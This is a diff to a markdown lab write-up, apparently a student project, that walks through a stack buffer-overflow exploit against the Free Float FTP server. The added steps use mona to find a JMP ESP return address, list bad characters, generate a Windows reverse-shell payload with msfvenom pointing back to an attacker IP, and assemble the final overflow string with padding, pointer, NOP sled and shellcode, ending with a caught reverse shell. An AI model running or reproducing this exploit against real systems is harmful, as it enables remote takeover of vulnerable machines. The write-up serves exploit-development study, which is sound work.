@@ -138,11 +138,39 @@ We can use Mona for this type the command on the white bar to see the list of av
 	!mona modules
 
 <img src = "https://imgur.com/pUjp5mR.png" height="40%" width="40%"></br>
-An ideal candidate for a module would be All False, but anything with a ASLR as False can be picked as a candidate</br>
-Here, we can select the **SHELL.dll** as our module</br> 
+An ideal candidate for a module would be All False in the protection settings, but anything with an ASLR as False can be picked as a candidate</br>
+We can see the ftpserver,exe has all False, but it donot have any JMP code so we can select the **SHELL.dll** as our module</br> 
 
+<h4>3.3 JMP Opcode Equivalent </h4>
+Now that we selected the module for our attack, we now need to find the opcode equivalent of the jmp</br>
+An opcode equivalent is the conversion of an assembly language to hex code.We are using the JMP ESP as a pointer to our malicious code</br>
+We can use msf-nasm_shell for this</br>
+<img src = "https://imgur.com/Cnnqtyk.png" height="40%" width="40%"></br>
+Hex code for JMP ESP is FFE4</br>
+Let's find out which address of our SHELL32.dll can be used as our pointer</br>
+Pass the JMP ESP hex code in mona</br>
 
-<h3>4. Creating a Shell Code</h3>
+	!mona find -s "\xff\xe4" -m SHELL32.dll
+<img src = "https://imgur.com/EERosY5.png" height="40%" width="40%"></br>
+Here, we are looking for the return addresses which have most False in memory protection, we can see the first one has writecopy and ASLR and REBASE as False. Let's use that</br>
+Note down the return address - **0x7cbd41fb** </br>
+So, instead of the 4 "B" in the EIP we are placing our pointer so that the EIP would be the Jump code and the jump code would point to our malicious code</br>
+To place the pointer, Restart the programme (ctrl +f2) and click on the black arrow -> and enter our expression</br>
+<img src = "https://imgur.com/IALqCvI.png" height="40%" width="40%"></br>
+
+<img src = "https://imgur.com/cESn48h.png" height="40%" width="40%"></br>
+Select the FFE4 and Press F2, click Yes and run the programme (F9)</br> 
+<img src = "https://imgur.com/4e5LehC.png" height="40%" width="40%"></br>
+
+<h4>3.4 Confirming Breakpoint </h4>
+Now that we set our breakpoint (7cbd41fb), let's find out whether it works</br>
+So we are gonna set our python script to tell immunity that on hitting this spot (the jump code) to break the programme, Pause it and wait for further  instruction from us</br>
+The script is <a href = "https://raw.githubusercontent.com/V4g4b0nd/Projects/main/Bufffer%20Overflow%20(Free%20Float%20FTP)/breakpoint.py">here</a></br>
+We cam see immunty paused and we have hit our breakpoint (7cbd41fb)</br>
+<img src = "https://imgur.com/QP5RZ4x.png" height="40%" width="40%"></br>
+Now we only need to generate a shell code and point to it </br>
+
+<h3>4. Shell Code</h3>
 <h4>4.1 Finding Bad characters </h4>
 Before creating the shell code, we need to figure out which characters are good for the code and which all are bad.</br>
 We can find it by running all the hex characters through the program and how it parses out. </br>
@@ -180,9 +208,35 @@ Now we are able to see all the characters just like we intended. So the bad char
  	0x0(which is always a bad character), 0xa,0xd
 <img src = "https://imgur.com/eDcPUk8.png" height="40%" width="40%"></br>
 
+<h4>4.1 Generating Shell code</h4>
+We can use msfvenom for this and create areverse shell (victim us connecting back to us)</br>
 
+	Msfvenom -p windows/shell_reverse_tcp LHOST = 192.168.1.49 LPORT = 1234 EXITFUNC=thread -f python -a x86 -b "\X00\x0a\x0d"
+ 	-p = payload
+	LHOST = attack machine IP
+	LPORT = listening port
+	EXITFUNC = for stability 
+	-f = file type
+	-a = architecture 
+	-b = bad characters
+ 
+Ammedn our script with the payload</br>
+We need to add padding of "/x90" character between our jump command and shell code, without this there is a chance that the attack won't succeed.</br>
+If we have limited space, we can limit the padding to 8 or 16 (play around and figure out the padding).</br>
+So our final Payload format will be </br>
 
+	payload = b"USER "+b"A"*230 + b"\xfb\x41\xbd\x7c" +b"\x90"*20 + buf
+ 	USER arguemt to the server
+  	230 characters of A (till the offset value)
+   	\xfb\x41\xbd\x7c - our pointer 
+	buf - Payload
+The full python script is <a href = "https://raw.githubusercontent.com/V4g4b0nd/Projects/main/Bufffer%20Overflow%20(Free%20Float%20FTP)/exploit.py">here</a></br>
+Let's setup  a netcat lister on port 1234 and run our script</br>
+Note - Close Immunity and run the FTP server as an application in the server</br>
 
+**We got a reverse shell back**</br>
+<img src = "https://imgur.com/EHGvYMd.png" height="40%" width="40%"></br>
+<img src = "https://imgur.com/ackivsx.png" height="40%" width="40%"></br>
 
 
   
